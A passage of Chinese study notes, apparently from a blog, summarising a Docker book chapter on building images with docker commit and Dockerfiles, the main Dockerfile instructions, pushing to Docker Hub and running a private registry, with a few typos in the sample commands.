中有两种类型的仓库:</p><ul><li>用户仓库(user repository), 都是由 Docker 用户创建的, 其命名由用户名和仓库名两部分组成</li><li>顶层仓库(top-level repository), 由 Docker 内部的人来管理, 其命名只包含仓库名</li></ul><h2 id="4-3-拉取镜像"><a href="#4-3-拉取镜像" class="headerlink" title="4.3 拉取镜像"></a>4.3 拉取镜像</h2><p>如:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker pull <span class="hljs-symbol">fedora:</span><span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><h2 id="4-4-查找镜像"><a href="#4-4-查找镜像" class="headerlink" title="4.4 查找镜像"></a>4.4 查找镜像</h2><p>使用 <code>docker search</code> 命令来查找所有 Docker Hub 上公共的可用镜像。</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker search puppet<br></code></pre></td></tr></table></figure><h2 id="4-5-构建镜像"><a href="#4-5-构建镜像" class="headerlink" title="4.5 构建镜像"></a>4.5 构建镜像</h2><p>两种方法:</p><ul><li>docker commit</li><li>docker build 和 Dockerfile 文件<br>使用 <code>Dockerfile</code> 更加灵活.</li></ul><h3 id="4-5-1-创建-Docker-Hub"><a href="#4-5-1-创建-Docker-Hub" class="headerlink" title="4.5.1 创建 Docker Hub"></a>4.5.1 创建 Docker Hub</h3><p>登录到 Docker Hub, 使用 <code>docker login</code> 命令:<br><code>$ sudo docker login</code><br>用户的个人认证信息会被保存在 <code>$HOME/.docker/config.json</code> 中。</p><h3 id="4-5-2-用-Docker-的-commit-命令创建镜像"><a href="#4-5-2-用-Docker-的-commit-命令创建镜像" class="headerlink" title="4.5.2 用 Docker 的 commit 命令创建镜像"></a>4.5.2 用 Docker 的 commit 命令创建镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker commit 4aab3ce3cb76 jamtur01/apache2</span><br></code></pre></td></tr></table></figure><p><code>4aab3ce3cb76</code> 是容器的 ID, <code>jamtur01</code> 是目标镜像仓库, <code>apache2</code> 是镜像名.</p><p><code>docker commit</code> 提交的只是创建容器的镜像与容器的当前状态之间有差异的部分。</p><p>可以在提交镜像时指定更多的数据(包括标签):</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker commit -m<span class="hljs-string">&quot;A new custom image&quot;</span> -a<span class="hljs-string">&quot;James Turnbull&quot;</span> 4aab3ce3cb76 jamtur01/apache2:webserver</span><br></code></pre></td></tr></table></figure><p><code>-m</code> 选项是创建镜像的提交信息。</p><p><code>-a</code> 选项是该镜像的作者信息。</p><p><code>webserver</code> 是标签名。</p><p>可以使用 <code>docker inspect</code> 命令来查看新创建的镜像的详细信息:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker inspect jamtur01/apache2:webserver</span><br></code></pre></td></tr></table></figure><h3 id="4-5-3-用-Dockerfile-构建镜像"><a href="#4-5-3-用-Dockerfile-构建镜像" class="headerlink" title="4.5.3 用 Dockerfile 构建镜像"></a>4.5.3 用 Dockerfile 构建镜像</h3><p>一般不推荐使用 <code>docker commit</code> 来构建镜像。</p><p>Dockerfile 使用基本的基于 DSL(Domain Specific Language) 语法的指令来构建一个 Docker 镜像。</p><h4 id="第一个-Dockerfile"><a href="#第一个-Dockerfile" class="headerlink" title="第一个 Dockerfile"></a>第一个 Dockerfile</h4><p>创建的用来保存 Dockerfile 的目录称为构建环境(build environment), Docker 则称此环境为上下文(context)或构建上下文(build context),</p><p>Docker 会在构建镜像时将构建上下文和该上下文中的文件和目录上传到 Docker 守护进程。</p><p>例子:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># Version: 0.0.1</span><br><span class="hljs-keyword">FROM</span> ubuntu:14.04<br>MAINTAINER james Turnbull <span class="hljs-string">&quot;james@example.com&quot;</span><br><span class="hljs-built_in">RUN</span> apt-<span class="hljs-built_in">get</span> update &amp;&amp; apt-<span class="hljs-built_in">get</span> install -y nginx<br><span class="hljs-built_in">RUN</span> echo <span class="hljs-string">&#x27;Hi, I am in your container&#x27;</span> \<br>    &gt;/usr/share/nginx/html/index.html<br>EXPOSE 80<br></code></pre></td></tr></table></figure><p>Dockerfile 由指令和参数构成。</p><p>每条指令，如 <code>FROM</code>, 都必须为大写字母, 而且后面要跟随一个参数.</p><p>每条指令都会创建一个新的镜像层并对镜像进行提交。</p><p>运行流程:</p><ul><li>Docker从基础镜像运行一个容器。<br>  -执行一条指令，对容器做出修改。<br>  -执行类似docker commit的操作，提交一个新的镜像层。<br>  -Docker再基于刚提交的镜像运行一个新容器。<br>  -执行Dockerfile中的下一条指令，直到所有指令都执行完毕</li></ul><p>Dockerfile 中的注释是 <code>#</code> 开头的行.</p><p><code>MAINTAINER</code> 指令告诉 Docker 该镜像的作者是谁，以及作者的电子邮件地址。</p><p><code>RUN</code> 指令会在当前镜像中运行指定的命令. 每条 <code>RUN</code> 指令都会创建一个新的镜像层。</p><p>默认情况下，<code>RUN</code> 指令会在 shell 里使用 <code>/bin/sh -c</code> 来执行。</p><p>若在不支持 shell 的平台上，使用 <code>exec</code> 格式的 <code>RUN</code> 指令:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">RUN</span> [<span class="hljs-string">&quot;appt-get&quot;</span>, <span class="hljs-string">&quot; install&quot;</span>, <span class="hljs-string">&quot;-y&quot;</span>, <span class="hljs-string">&quot;nginx&quot;</span>]<br></code></pre></td></tr></table></figure><p>这里的 <code>-y</code> 参数是 <code>yes</code> 的意思。</p><p><code>EXPOSE</code> 指令，告诉 Docker 该容器内的应用程序将会使用容器的指定端口。</p><p>可以指定多个 <code>EXPOSE</code> 指令来向外部公开多个端口。</p><h3 id="4-5-4-基于-Dockerfile-构建新镜像"><a href="#4-5-4-基于-Dockerfile-构建新镜像" class="headerlink" title="4.5.4 基于 Dockerfile 构建新镜像"></a>4.5.4 基于 Dockerfile 构建新镜像</h3><p>执行 <code>docker build</code> 命令时，Dockerfile 中的所有指令都会被执行并且提交，并且在该命令成功结束后返回一个新镜像。</p><p>使用 <code>-t</code> 选项为新镜像设置仓库和名称以及标签:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sudo docker build -t=<span class="hljs-string">&quot;jamtur01/static_web:v1&quot;</span> .<br></code></pre></td></tr></table></figure><p>如果没有制定任何标签，Docker 将会自动为镜像设置一个 <code>latest</code> 标签.</p><p>最后一个 <code>.</code> 告诉 Docker 到本地目录中找 Dockerfile 文件，也可指定一个 Git 仓库的源地址来指定 Dockerfile 的位置.</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sudo docker build -t=<span class="hljs-string">&quot;jamtur01/static_web:v1&quot;</span> git<span class="hljs-variable">@github</span>.<span class="hljs-symbol">com:</span>jamtur01/docker-static_web<br></code></pre></td></tr></table></figure><p><code>-f</code> 参数指定文件:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ sudo docker build -t=<span class="hljs-string">&quot;jamtur01/static_web&quot;</span> -f path<span class="hljs-regexp">/to/</span><span class="hljs-keyword">file</span><br></code></pre></td></tr></table></figure><p>构建目录中的 <code>.dockerignore</code> 类似于 <code>.gitignore</code></p><h3 id="4-5-5-指令失败时会怎样"><a href="#4-5-5-指令失败时会怎样" class="headerlink" title="4.5.5 指令失败时会怎样"></a>4.5.5 指令失败时会怎样</h3><h3 id="4-5-6-Dockerfile-和构建缓存"><a href="#4-5-6-Dockerfile-和构建缓存" class="headerlink" title="4.5.6 Dockerfile 和构建缓存"></a>4.5.6 Dockerfile 和构建缓存</h3><p>它会将之前的镜像层看做缓存，意思是第二次 <code>docker build</code> 时，会接着从上次结束时运行。</p><p>忽略缓存功能，使用 <code>docker build --no-cache</code></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> sudo docker build --<span class="hljs-keyword">no</span>-cache -t=<span class="hljs-string">&quot;jamtur01/static_web&quot;</span><br></code></pre></td></tr></table></figure><h3 id="4-5-7-基于构建缓存的-Dockerfile-模板"><a href="#4-5-7-基于构建缓存的-Dockerfile-模板" class="headerlink" title="4.5.7 基于构建缓存的 Dockerfile 模板"></a>4.5.7 基于构建缓存的 Dockerfile 模板</h3><p>一般在 Dockerfile 文件顶部使用相同的指令集模板:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">FROM</span> ubuntu:<span class="hljs-number">14</span>.<span class="hljs-number">04</span><br><span class="hljs-attribute">MAINTAINER</span> James Turnbull <span class="hljs-string">&quot;james@example.com&quot;</span><br><span class="hljs-attribute">ENV</span> REFRESHED_AT <span class="hljs-number">2014</span>-<span class="hljs-number">07</span>-<span class="hljs-number">01</span><br><span class="hljs-attribute">RUN</span> apt-get -qq update<br></code></pre></td></tr></table></figure><p><code>ENV</code> 指令用于在镜像中设置环境变量。</p><p>模板实际上就是自己常用的配置。</p><h3 id="4-5-8-查看新镜像"><a href="#4-5-8-查看新镜像" class="headerlink" title="4.5.8 查看新镜像"></a>4.5.8 查看新镜像</h3><p>深入探求镜像是如何被构建出来的，使用 <code>docker history</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> sudo docker <span class="hljs-built_in">history</span> <span class="hljs-number">22</span>d47c8cb6e5<br></code></pre></td></tr></table></figure><h3 id="4-5-9-从新镜像启动容器"><a href="#4-5-9-从新镜像启动容器" class="headerlink" title="4.5.9 从新镜像启动容器"></a>4.5.9 从新镜像启动容器</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">$ sudo docker <span class="hljs-keyword">run</span><span class="language-bash"> -d -p 80 --name static_web jamtur01/static_web nginx -g <span class="hljs-string">&quot;daemon off;&quot;</span></span><br></code></pre></td></tr></table></figure><p><code>-d</code> 选项告诉 Docker 以分离(detached)的方式在后台运行。</p><p><code>-p</code> 选项，用来控制 Docker 在运行时应该公开哪些网络端口给外部(宿主机).</p><p>Docker 可以通过两种方法来在宿主机上分配端口:</p><ul><li>Docker 可以在宿主机上随机选择一个位于 32768~61000 的比较大的端口号来映射到容器的 80 端口上</li><li>可以在 Docker 宿主机中指定一个具体的端口号来映射到容器中的 80 端口上</li></ul><p><code>docker run</code> 命令会在 Docker 宿主机上随即打开一个端口，连接到容器中的 80 端口上。</p><p>可用 <code>docker ps</code> 命令查看容器的端口分配情况:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> sudo docker <span class="hljs-built_in">ps</span> <span class="hljs-literal">-l</span><br></code></pre></td></tr></table></figure><p>也可通过 <code>docker port</code> 命令来查看容器的端口映射情况:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker port <span class="hljs-number">6751</span>b94bb5c0 <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>使用 <code>-p</code> 选项指定容器中的端口映射到 Docker 宿主机的某一特定端口上:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">$ sudo docker <span class="hljs-built_in">run</span> -d -p <span class="hljs-number">80</span>:<span class="hljs-number">80</span> <span class="hljs-comment">--name static_web</span><br></code></pre></td></tr></table></figure><p>前者是宿主机端口，后者是容器端口。 </p><p>将端口绑定限制在特定的网络接口(即IP地址)上:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">$ sudo docker <span class="hljs-keyword">run</span><span class="language-bash"> -d -p 127.0.0.1:80:80 --name static_web jamtur01/static_web nginx -g <span class="hljs-string">&quot;daemon off;&quot;</span></span><br></code></pre></td></tr></table></figure><p>其将容器内的 80 端口绑定到本地宿主机的 127.0.0.1 这个 IP 的 80 端口上. 不指定如 80 就是随机端口。</p><p>使用 <code>-P</code> 参数将 Dockerfile 中通过 <code>EXPOSE</code> 指令指定的端口公开:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">$ sudo docker <span class="hljs-keyword">run</span><span class="language-bash"> -d -P --name static_web jamtur01/static_web nginx -g <span class="hljs-string">&quot;daemon off;&quot;</span></span><br></code></pre></td></tr></table></figure><p>并绑定到随机端口。</p><p>有了这个端口号，就可以使用本地宿主机的 IP 地址连接到运行中的容器.</p><h3 id="4-5-10-Dockerfile-指令"><a href="#4-5-10-Dockerfile-指令" class="headerlink" title="4.5.10 Dockerfile 指令"></a>4.5.10 Dockerfile 指令</h3><p>[清单](<a href="http://docs.docker.com/">http://docs.docker.com/</a> reference &#x2F;builder&#x2F;)</p><h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><p>用于指定一个容器启动时要运行的命令.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">CMD <span class="hljs-selector-attr">[<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-l&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>后面为参数.</p><p>这是存储在一个数组结构中.</p><p><code>docker run</code> 命令后若指定要运行的命令, 会覆盖 Dockerfile 中的 CMD 指令.</p><p>在 Dockerfile 中只能指定一条 CMD 命令.</p><h4 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h4><p><code>docker run</code> 命令行中指定的任何参数都会被当做参数再次传递给 <code>ENTRYPOINT</code> 指令中指定的命令.</p><p>如:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ENTERYPOINT <span class="hljs-selector-attr">[<span class="hljs-string">&quot;/usr/sbin/ nginx&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>然后:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo docker build <span class="hljs-attribute">-t</span>=<span class="hljs-string">&quot;jamtur01/static_web&quot;</span><br>$ sudo docker <span class="hljs-built_in">run</span> -t -i jamtur01/static_web -g <span class="hljs-string">&quot;daemon off;&quot;</span><br></code></pre></td></tr></table></figure><p>其中 <code>-g &quot;daemon off;&quot;</code> 就会传递给 <code>ENTEYPOINT</code></p><p>可用 <code>docker run</code> 的 <code>--entrypoint</code> 选项来覆盖 <code>ENTRYPOINT</code> 指令.</p><h4 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h4><p>用来从镜像创建一个容器时,在容器内部设置一个工作目录,<code>ENTRYPOINT</code> 和 <code>/</code> 或 <code>CMD</code> 指定的程序会在这个目录下执行.</p><p>可以设置不同的工作目录:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /opt/webapp/db</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> bundle install</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /opt/webapp</span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;rackup&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>可以通过 <code>-w</code> 选项在运行时设置工作目录:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">$ sudo docker <span class="hljs-keyword">run</span> -ti -w /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span> ubuntu <span class="hljs-keyword">pwd</span><br></code></pre></td></tr></table></figure><h4 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h4><p>用于设置环境变量:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ENV RVM_PATH <span class="hljs-regexp">/home/</span>rvm/<br></code></pre></td></tr></table></figure><p>也可通过 <code>docker run</code> 命令的 <code>-e</code> 参数来传递环境变量:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">$ sudo docker <span class="hljs-keyword">run</span><span class="language-bash"> -ti -e <span class="hljs-string">&quot;WEB_PORT=8000&quot;</span> ubuntu <span class="hljs-built_in">env</span></span><br></code></pre></td></tr></table></figure><h4 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h4><p>指定该镜像以什么样的用户去执行:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">USER</span> <span class="hljs-title">nginx</span><br></code></pre></td></tr></table></figure><p>可以指定用户名或 UID 以及组或 GID:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">USER</span> <span class="hljs-title">user</span><br><span class="hljs-keyword">USER</span> <span class="hljs-title">user</span>:<span class="hljs-keyword">group</span><br><span class="hljs-title">USER</span> uid<br><span class="hljs-keyword">USER</span> <span class="hljs-title">uid</span>:gid<br><span class="hljs-keyword">USER</span> <span class="hljs-title">user</span>:gid<br><span class="hljs-keyword">USER</span> <span class="hljs-title">uid</span>:group<br></code></pre></td></tr></table></figure><p>默认用户为 root, 可以用 <code>docker run</code> 的 <code>-u</code> 选项覆盖.</p><h4 id="VOLUME"><a href="#VOLUME" class="headerlink" title="VOLUME"></a>VOLUME</h4><h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>在没有在 <code>docker run</code> 时使用 <code>-v</code> 选项时, 创建一个隐藏数据卷.</p><h5 id="什么是隐藏数据卷"><a href="#什么是隐藏数据卷" class="headerlink" title="什么是隐藏数据卷"></a>什么是隐藏数据卷</h5><p>也就是没有指定宿主机上面的某一个目录, 因此自动在 <code>/var/lib/docker/volumes</code> 目录下自动创建的一个卷.</p><h5 id="VOLUME-的作用"><a href="#VOLUME-的作用" class="headerlink" title="VOLUME 的作用"></a>VOLUME 的作用</h5><p>比如我们在 Dockerfile 中写 <code>VOLUME [ &quot;/Blog&quot; ]</code>, 并且在 run 的时候没有添加 <code>-v</code> 选项, 那么在容器创建后, 会生成 <code>/Blog</code> 这个目录, 以及在 <code>/var/lib/docker/volumes</code> 下生成一个卷, 这两个相互映射.<br>用来向基于镜像创建的容器添加卷, 一个卷是可以存在于一个或者多个容器内的特定的目录.</p><p>特点:</p><ul><li>卷可以在容器间共享和重用</li><li>一个容器可以不是必须和其他容器共享卷</li><li>对卷的修改是立时生效的</li><li>对卷的修改不会对更新镜像产生影响</li><li>卷会一直存在知道没有任何容器再使用它.</li></ul><p>卷功能可以让我们将内容添加到镜像而不提交.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">VOLUME <span class="hljs-selector-attr">[<span class="hljs-string">&quot;/opt/project&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>为基于此镜像创建的任何容器创建一个名为 <code>/opt/project</code> 的挂载点.</p><p><code>docker cp</code> 允许从容器复制文件和复制文件到容器上.</p><p>指定多个卷:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">VOLUME <span class="hljs-selector-attr">[<span class="hljs-string">&quot;/opt/project&quot;</span>, <span class="hljs-string">&quot;/data&quot;</span>]</span><br></code></pre></td></tr></table></figure><h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><p>用来将构建环境下的文件和目录复制到镜像中.</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">ADD</span> software.lic /<span class="hljs-meta">opt</span>/application/software.lic<br></code></pre></td></tr></table></figure><p>前者为原文件位置,后者为目的文件位置.</p><p>源文件位置也可以是 URL.</p><p>Docker 通过目的地址参数末尾的字符来判断文件源是目录还是文件:</p><ul><li>目的地址以 <code>/</code> 结尾, 则为目录</li><li>不以, 则为文件</li></ul><p>如果将压缩文件指定为源文件,会将其解压:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ADD latest.tar.gz <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/wordpress/</span><br></code></pre></td></tr></table></figure><p>目前 Docker 还不支持以 URL 方式指定的源文件位置中使用归档文件.</p><p><code>ADD</code> 指令会使构建缓存无效.</p><h4 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h4><p>类似于 <code>ADD</code>, 但 <code>COPY</code> 只关心在构建上下文中复制本地文件,而不会 extraction 和 decompression.</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">COPY</span> conf.d<span class="hljs-regexp">/ /</span>etc<span class="hljs-regexp">/apache2/</span><br></code></pre></td></tr></table></figure><p>文件源路径必须是一个与当前构建环境相对的文件或者目录, 本地文件都放到和 Dockerfile 同一个目录下,不能复制该目录之外的任何文件.</p><h4 id="LABEL"><a href="#LABEL" class="headerlink" title="LABEL"></a>LABEL</h4><p>用于为 Docker 镜像添加元数据. 元数据以键值对的形式展现:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">LABEL version<span class="hljs-operator">=</span><span class="hljs-string">&quot;1.0&quot;</span><br>LAVEL location<span class="hljs-operator">=</span><span class="hljs-string">&quot;New York&quot;</span> type<span class="hljs-operator">=</span><span class="hljs-string">&quot;Data Center&quot;</span> role<span class="hljs-operator">=</span><span class="hljs-string">&quot;Web Server&quot;</span><br></code></pre></td></tr></table></figure><p>推荐将所有元数据都放到一条 LABEL 指令中.</p><p>然后通过  <code>docker inspect</code> 命令来查看 Docker 镜像中的标签信息.</p><h4 id="STOPSIGNAL"><a href="#STOPSIGNAL" class="headerlink" title="STOPSIGNAL"></a>STOPSIGNAL</h4><p>用来设置停止容器时发送什么系统调用给容器. 这个信号必须是内核系统调用表中合法的数或者 SIGNAME 格式中的信号名称.</p><h4 id="ARG"><a href="#ARG" class="headerlink" title="ARG"></a>ARG</h4><p>用来定义可以在 <code>docker build</code> 命令运行时传递给构建运行时的变量, 只需在构建时使用 <code>--build-arg</code> 参数, 用户只能在构建时指定在 Dockerfile 文件中定义过的参数:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">ARG</span> build<br><span class="hljs-keyword">ARG</span> webapp_user=<span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure><p>第二条指定了默认值:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">$ sudo docker <span class="hljs-keyword">build </span>--<span class="hljs-keyword">build-arg </span><span class="hljs-keyword">build=1234 </span>-t <span class="hljs-keyword">jamtur01/webapp</span><br></code></pre></td></tr></table></figure><p>不要使用 <code>ARG</code> 来传递证书或者密钥.      </p><p>Docker 预定义了一组 ARG 变量:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">HTTP<span class="hljs-emphasis">_PROXY</span><br><span class="hljs-emphasis">http_proxy</span><br><span class="hljs-emphasis">HTTPS_PROXY</span><br><span class="hljs-emphasis">https_proxy</span><br><span class="hljs-emphasis">ftp_proxy</span><br><span class="hljs-emphasis">FTP_PROXY</span><br><span class="hljs-emphasis">NO_PROXY</span><br><span class="hljs-emphasis">no_</span>proxy<br></code></pre></td></tr></table></figure><h4 id="ONBUILD"><a href="#ONBUILD" class="headerlink" title="ONBUILD"></a>ONBUILD</h4><p>为镜像添加触发器(trigger). 当一个镜像被用作其他镜像的基础镜像时, 该镜像中的触发器将会被执行.</p><p>触发器会在构建过程中插入新指令, 我们可以认为这些指令是紧跟在 FROM 之后指定的:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">ONBUILD</span> <span class="hljs-keyword">ADD</span><span class="language-bash"> . /app/arc</span><br><span class="hljs-keyword">ONBUILD</span> <span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /app/src &amp;&amp; make</span><br></code></pre></td></tr></table></figure><p><code>ONBUILD</code> 指令可以在镜像上运行 <code>docker inspect</code> 查看.</p><p><code>ONBUILD</code> 触发器会按照父镜像中指定的顺序执行, 并且只能被继承一次.</p><p>有部分指令不能用在 <code>ONBUILD</code> 中, 防止递归调用.</p><h2 id="4-6-将镜像推送到-Docker-Hub"><a href="#4-6-将镜像推送到-Docker-Hub" class="headerlink" title="4.6 将镜像推送到 Docker Hub"></a>4.6 将镜像推送到 Docker Hub</h2><p>使用 <code>docker push</code> 命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker push jamtur01/static_web</span><br></code></pre></td></tr></table></figure><p>应该要先登录, 用 <code>docker login</code></p><h3 id="自动构建-Automated-Builds"><a href="#自动构建-Automated-Builds" class="headerlink" title="自动构建(Automated Builds)"></a>自动构建(Automated Builds)</h3><p>将 Github 或 BitBucket 中含有 Dockerfile 文件的仓库连接到 Docker Hub 即可. 具体参考书籍.</p><h2 id="4-7-删除镜像"><a href="#4-7-删除镜像" class="headerlink" title="4.7 删除镜像"></a>4.7 删除镜像</h2><p>使用 <code>docker rmi</code>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker rmi jamtur01/static_web</span><br></code></pre></td></tr></table></figure><p>每一个 <code>Deleted:</code> 行都代表一个镜像层被删除.</p><h2 id="4-8-运行自己的-Docker-Registry"><a href="#4-8-运行自己的-Docker-Registry" class="headerlink" title="4.8 运行自己的 Docker Registry"></a>4.8 运行自己的 Docker Registry</h2><p>Registry 就相当于 repository.</p><h3 id="4-8-1-从容器运行-Registry"><a href="#4-8-1-从容器运行-Registry" class="headerlink" title="4.8.1 从容器运行 Registry"></a>4.8.1 从容器运行 Registry</h3><p>从容器安装一个 Registry:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo docker <span class="hljs-built_in">run</span> -p 5000:5000 registry:2<br></code></pre></td></tr></table></figure><p>启动一个运行 Registry 应用 2.0 版本的容器.</p><h3 id="4-8-2-测试新-Registry"><a href="#4-8-2-测试新-Registry" class="headerlink" title="4.8.2 测试新 Registry"></a>4.8.2 测试新 Registry</h3><p>先通过 <code>docker images</code> 找到镜像 ID:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker images jamtur01/static_web</span><br></code></pre></td></tr></table></figure><p>然后用 Registry 给镜像打上标签:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">$ sudo docker <span class="hljs-keyword">tag</span> <span class="hljs-title">22d47c8cb6e5</span><br></code></pre></td></tr></table></figure><p>最后通过 <code>docker push</code> 将其推送到 Registry 中, 